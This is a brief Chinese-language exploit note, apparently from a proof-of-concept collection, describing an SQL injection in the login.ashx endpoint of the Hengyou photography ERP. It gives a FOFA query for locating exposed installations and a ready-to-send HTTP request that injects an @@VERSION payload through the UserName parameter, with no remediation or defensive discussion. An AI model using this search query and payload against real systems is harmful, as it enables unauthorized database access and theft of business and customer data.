## 恒友摄影ERP的login.ashx存在SQL注入

## fofa
```
body="BookChooseDateOrder.html"
```

## poc
```
GET /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin'+AND+1=@@VERSION--&UserPwd=1 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
```
